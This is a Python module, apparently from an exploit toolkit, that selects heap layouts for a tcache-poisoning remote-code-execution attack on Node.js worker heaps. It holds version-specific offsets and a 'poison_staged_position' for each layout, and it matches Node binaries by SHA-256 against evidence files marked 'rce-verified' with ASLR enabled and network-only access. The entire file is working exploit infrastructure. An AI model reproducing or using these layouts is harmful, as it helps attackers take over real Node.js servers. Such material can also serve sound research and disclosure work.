#!/usr/bin/env python3
"""Select constrained worker-heap layouts by verified binary fingerprint.

The selector deliberately does not infer an exploit layout from a version
number.  Exact official binaries are matched against the already committed,
network-only verification evidence.  Unknown binaries receive the complete
allowlist as fallbacks and are never reported as an exact match.
"""

from __future__ import annotations

import json
from functools import lru_cache
from pathlib import Path
import re


ROOT = Path(__file__).parents[1]
DEFAULT_EVIDENCE_DIR = ROOT / "evidence" / "aslr-on-network-only"
SHA256 = re.compile(r"[0-9a-f]{64}")

_RAW_LAYOUTS = (
    ("v22-early-0x250", 0x250, 36, 0x800AB18),
    ("v22-0x250-new-ring", 0x250, 36, 0x800AB70),
    ("v22-modern-0x220", 0x220, 33, 0x800AB70),
    ("v22-0x220-old-ring", 0x220, 33, 0x800AB18),
    ("v24-0x330", 0x330, 50, 0x800AB70),
    ("v24-0x200", 0x200, 31, 0x800AB70),
    ("v26-0x200", 0x200, 31, 0x800AB70),
)


def _layout(
    name: str,
    record_size: int,
    tcache_index: int,
    ring_from_heap: int,
    *,
    selection: str,
) -> dict[str, int | str]:
    entry_from_heap = 0x8E0 + 0x80 + tcache_index * 8
    return {
        "name": name,
        "record_size": record_size,
        "tcache_index": tcache_index,
        "ring_from_heap": ring_from_heap,
        "tcache_entry_from_heap": entry_from_heap,
        "poison_staged_position": entry_from_heap - ring_from_heap,
        "selection": selection,
    }


LAYOUTS = {
    name: _layout(
        name,
        record_size,
        tcache_index,
        ring_from_heap,
        selection="allowlisted-fallback",
    )
    for name, record_size, tcache_index, ring_from_heap in _RAW_LAYOUTS
}


@lru_cache(maxsize=4)
def verified_fingerprint_index(
    evidence_dir: Path = DEFAULT_EVIDENCE_DIR,
) -> dict[str, dict[str, str]]:
    """Return SHA-256 -> verified layout metadata after strict validation."""

    index: dict[str, dict[str, str]] = {}
    for path in sorted(evidence_dir.glob("*.json")):
        if path.name == "summary.json":
            continue
        record = json.loads(path.read_text(encoding="utf-8"))
        if record.get("result") != "rce-verified":
            continue
        if record.get("verification_mode") != (
            "official-linux-x64-aslr-enabled-network-only-worker-heap"
        ):
            continue
        digest = str(record.get("node_binary_sha256", ""))
        profile = record.get("profile", {})
        name = str(profile.get("layout_candidate", ""))
        if SHA256.fullmatch(digest) is None or name not in LAYOUTS:
            raise RuntimeError(f"invalid verified heap evidence: {path}")
        expected = LAYOUTS[name]
        observed = {
            "record_size": int(str(profile["record_size"]), 0),
            "tcache_index": int(profile["tcache_index"]),
            "ring_from_heap": int(str(profile["ring_from_heap"]), 0),
            "poison_staged_position": int(str(profile["poison_staged_position"]), 0),
        }
        for field, value in observed.items():
            if value != expected[field]:
                raise RuntimeError(
                    f"evidence layout mismatch in {path.name}: {field}={value:#x}"
                )
        if digest in index:
            raise RuntimeError(f"duplicate verified Node binary fingerprint: {digest}")
        index[digest] = {
            "layout": name,
            "version": str(record["version"]),
            "evidence": path.relative_to(ROOT).as_posix(),
        }
    return index


def select_layouts(
    node_binary_sha256: str,
    evidence_dir: Path = DEFAULT_EVIDENCE_DIR,
) -> list[dict[str, int | str]]:
    """Prioritize an exact verified layout, then return safe fallbacks."""

    if SHA256.fullmatch(node_binary_sha256) is None:
        raise ValueError("invalid Node binary SHA-256")
    match = verified_fingerprint_index(evidence_dir).get(node_binary_sha256)
    ordered_names = list(LAYOUTS)
    if match is not None:
        ordered_names.remove(match["layout"])
        ordered_names.insert(0, match["layout"])
    selected: list[dict[str, int | str]] = []
    for position, name in enumerate(ordered_names):
        candidate = dict(LAYOUTS[name])
        if position == 0 and match is not None:
            candidate["selection"] = "verified-binary-fingerprint"
            candidate["matched_version"] = match["version"]
            candidate["evidence"] = match["evidence"]
        selected.append(candidate)
    return selected
